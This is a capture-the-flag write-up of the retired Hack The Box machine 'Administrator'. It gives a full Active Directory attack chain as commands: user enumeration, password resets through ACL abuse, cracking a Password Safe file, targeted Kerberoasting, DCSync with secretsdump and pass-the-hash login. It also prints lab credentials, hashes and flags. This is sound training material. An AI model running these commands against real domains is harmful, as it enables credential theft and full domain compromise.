---
layout: writeup
name: "Administrator"
platform: "HackTheBox"
category: "retired"
difficulty: "Medium"
permalink: /writeups/retired/administrator/
os: "Hack The Box"
tags: [Active Directory, Privilege Escalation, Password Cracking]
date: 2025-11-12
pwned: true
---
# CTF Writeup - Administrator (Hack The Box)

## 🧪 Machine Details

- **Platform:** Hack The Box
- **IP Address:** 10.10.11.42
- **Difficulty:** Medium
- **OS:** Windows
- **Category:** Active Directory, Privilege Escalation, Password Cracking

---

## 🧭 Summary

This box simulates a realistic domain environment with multiple users and privilege escalation paths. You're provided with initial low-privileged credentials (`Olivia:ichliebedich`) and work your way up to a full domain compromise. Key highlights include using ACL misconfigurations to reset passwords, enumerating FTP for secrets, cracking a password manager file with `john`, leveraging BloodHound for access control visualization, and executing a targeted Kerberoasting attack to capture a service account hash with `DCSync` rights for full domain admin access.

---

## 🔍 Enumeration

### 🔎 Nmap Scan

```bash
nmap -p- administrator.htb --min-rate 10000
nmap -p 21,53,88,... -sCV administrator.htb -oN nmapscan
```

Revealed common AD services: FTP, SMB, LDAP, Kerberos, WinRM.

---

## 🔑 Initial Access

You start with credentials:

```
Username: Olivia
Password: ichliebedich
```

- FTP login fails due to directory permissions.
- SMB and WinRM confirm login access.

```bash
nxc smb administrator.htb -u Olivia -p ichliebedich
nxc winrm administrator.htb -u Olivia -p ichliebedich
```

---

## 👥 User Enumeration

Enumerated RID brute forcing with `nxc`:

```bash
nxc smb administrator.htb -u Olivia -p ichliebedich --rid-brute | grep SidTypeUser
```

Collected users: michael, benjamin, emily, ethan, alexander, emma, etc.

---

## 🕸️ BloodHound AD Enumeration

```bash
bloodhound-python -u Olivia -p ichliebedich -d administrator.htb -ns 10.10.11.42 -c All
```

Olivia has `GenericAll` over `michael` → reset his password  
Michael has password reset rights on `benjamin` → reset again

```bash
bloodyAD -u olivia ... set password Michael ...
bloodyAD -u Michael ... set password Benjamin ...
```

---

## 🔐 FTP + Credential Recovery

```bash
nxc ftp administrator.htb -u Benjamin -p Password123
ftp> get Backup.psafe3
```

Converted to `john` hash:

```bash
pwsafe2john Backup.psafe3 > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Cracked password: `tekieromucho`

Used PasswordSafe GUI to reveal:
- alexander
- emily → password: UXLCI5iETUsIBoFVTj8yQFKoHjXmb

---

## 🧑‍💻 User Shell

```bash
evil-winrm -i administrator.htb -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
```

Captured user.txt:
```
4d479030c20afac8ee4ad1b7757959a6
```

---

## 🧬 Kerberoasting → DCSync

Emily has `GenericWrite` over `ethan`

```bash
python targetedKerberoast.py -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb ...
```

Time sync fix:

```bash
sudo rdate -n administrator.htb
```

Password recovered: `limpbizkit`

---

## 🧰 SecretsDump to Domain Admin

```bash
impacket-secretsdump administrator.htb/ethan:limpbizkit@dc.administrator.htb
```

Captured NTLM hash for Administrator:
```
3dc553ce4b9fd20bd016e098d2d2fd2e
```

Logged in as Administrator:

```bash
evil-winrm -i administrator.htb -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```

Got `root.txt`:
```
66cd2c404066adec0d050d2610a64c36
```

---

## 🧠 Lessons Learned

- Learned to leverage `BloodHound` for privilege relationships.
- Used `bloodyAD` to reset passwords.
- Cracked `Password Safe` files using `john`.
- Gained hands-on with `Kerberoasting`, `DCSync`, and `impacket-secretsdump`.
- Time desync issues can block Kerberos tools – always check and fix local clock.

---

✍️ *Writeup by inksec*  
🔗 [https://github.com/inkedqt](https://github.com/inkedqt)